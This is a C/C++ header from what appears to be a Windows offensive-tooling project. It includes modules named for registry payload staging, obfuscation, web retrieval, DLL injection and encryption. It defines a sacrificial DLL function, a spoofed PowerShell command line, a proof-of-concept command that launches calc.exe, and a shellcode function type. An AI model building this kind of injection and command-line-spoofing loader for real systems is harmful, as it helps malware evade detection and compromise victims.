#pragma once
#pragma comment(lib, "onecore.lib")
#pragma comment(lib, "kernel32.lib")

#include "CompileTimeHashEngine.h"
#include "../HashingAPI.h"
#include "Externals.h"
#include "SystemInteraction.h"

#ifdef __cplusplus
extern "C"
{
#endif


	#include "RegstryPayloadStaging.h"
	#include "Obfuscation.h"
	#include "WebRetrival.h"
	#include "UserInput.h"
	#include "Printers.h"
	#include "ErrorHandlers.h"
	#include "Win32FindDataArray.h"
	#include "rsrcPayloadTest.h"

	#include "dllinjection.h"
	
	#include "dllinjection.h"
	#include "peImageParser.h" // If this header is for C code
#include "Encryption.h"
	#define		SACRIFICIAL_DLL          "User32.dll"
	#define		SACRIFICIAL_FUNC         "MessageBoxA"
	#define     SPOOFED_COMMAND_LINE     L"powershell.exe Totally Legit Argument"
	#define		MALICIOUS_COMMAND_LINE   L"powershell.exe -NoExit calc.exe"


	typedef  VOID(WINAPI* fnShellCode)();

#ifdef __cplusplus
}
#endif
